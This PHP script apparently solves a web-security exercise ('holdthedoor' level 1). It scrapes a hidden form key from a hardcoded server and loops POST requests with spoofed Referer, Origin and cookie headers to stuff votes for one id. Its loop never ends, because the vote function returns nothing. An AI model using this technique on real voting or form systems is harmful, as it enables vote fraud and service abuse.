<?php

	function vote_kc(){
		 $procesado = false;

		 $url = 'http://158.69.76.135/level1.php';

		 $options = array(
	    	 	  'http' => array(
	    		  'header' => "Content-type: application/x-www-form-urlencoded\r\n",
	    		  'method' => 'GET'
	   		   ));

		$context = stream_context_create($options);
		$result = file_get_contents($url, false, $context);

		$find_key = array("");
		$init = strpos($result, 'value') + 7;
		for ($i = $init; $result[$i] != "\""; $i++){
	    	    	array_push($find_key, $result[$i]);

		}
		$final_key = join($find_key);

		$data = array(
              	      'id' => 1169,
              	      'holdthedoor' => "Submit",
	      	      'key' => $final_key
              	      );

		$options = array(
               		 'http' => array(
                 	 'header' => array("Content-type: application/x-www-form-urlencoded", "Referer: http://158.69.76.135/level_1.php", "Origin: http://158.69.76.135", "Cookie: HoldTheDoor=".$final_key),
                 	 'method' => 'POST',
		 	 'content' => http_build_query($data)
                 	 ));

		$context = stream_context_create($options);
		$result = file_get_contents($url, false, $context);
		$st = "<tr>\n    <td>\n1169    </td>\n    <td>\n";
		$counter_array = array();
		$ini = stripos($result, $st) + strlen($st);
		for ($i = $ini; $result[$i] != " "; $i++){
	    	    array_push($counter_array, $result[$i]);
		}
		$counter = join($counter_array);
		echo "\033[32m\nSuccess\033[0m\n", "\n";
		echo "Vote #", $counter, "\n";
	}
$contador = 0;
while ($contador < 4096){
    $contador = (int) vote_kc();
}
?>